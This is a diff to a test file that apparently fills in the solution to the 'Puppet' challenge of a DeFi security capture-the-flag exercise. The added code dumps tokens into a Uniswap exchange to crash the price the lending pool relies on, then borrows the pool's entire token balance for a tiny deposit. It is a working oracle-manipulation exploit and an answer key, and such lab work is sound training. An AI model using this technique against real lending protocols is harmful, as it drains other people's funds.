@@ -103,6 +103,28 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Swap 999 DVT for ETH
+        // This has the effect of drawing the lending pool rate close to 0.
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('999'));
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther('999'),                             // tokens_sold
+            1,                                                          // min_eth
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+
+        // Compute required deposit
+        /*
+        // Reproduce calculation using BigNumber
+        const uniswapETHBalance = (await ethers.provider.getBalance(this.uniswapExchange.address));
+        const uniswapDVTBalance = (await this.token.balanceOf(this.uniswapExchange.address));
+        const pool_rate = uniswapETHBalance.mul(ethers.constants.WeiPerEther).div(uniswapDVTBalance);
+        const deposit = ethers.BigNumber.from(POOL_INITIAL_TOKEN_BALANCE).mul(pool_rate).mul(ethers.BigNumber.from(2)).div(ethers.constants.WeiPerEther);
+        */
+        const deposit = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // console.log("Deposit required:", ethers.utils.formatEther(deposit));
+
+        // Borrow all tokens at current pool_rate
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });
     });
 
     after(async function () {
